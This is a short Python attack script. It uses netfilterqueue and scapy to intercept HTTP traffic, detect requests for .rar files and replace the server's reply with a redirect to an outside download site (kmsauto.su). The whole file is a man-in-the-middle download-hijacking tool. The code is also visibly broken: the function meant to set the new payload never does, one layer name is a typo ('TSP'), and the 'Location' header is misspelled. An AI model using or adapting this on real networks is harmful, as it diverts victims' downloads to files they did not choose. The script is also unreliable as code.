#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
from scapy.contrib.homeplugav import chksum32

REDIRECT_URL = "https://kmsauto.su/index.php?do=download&id=67"
ack_list = []
def set_load(packet, load):
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if b".rar" in scapy_packet[scapy.Raw].load:
                print("[+] RAR file request detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:

            if scapy_packet[scapy.TSP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TSP].seq)
                print("[+] Replacing file with redirect")
                redirect_response =(
                  f"HTTP/1.1 301 Moved Permanently\n"
                  f"Loaction: {REDIRECT_URL}\n\n"

                )
                modified_packet = set_load(scapy_packet, redirect_response.encode())
                packet.set_payload(bytes(modified_packet))
    packet.accept()
def main():
    print("[*] File replacement started...")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()

if __name__ == "__main__":
   main()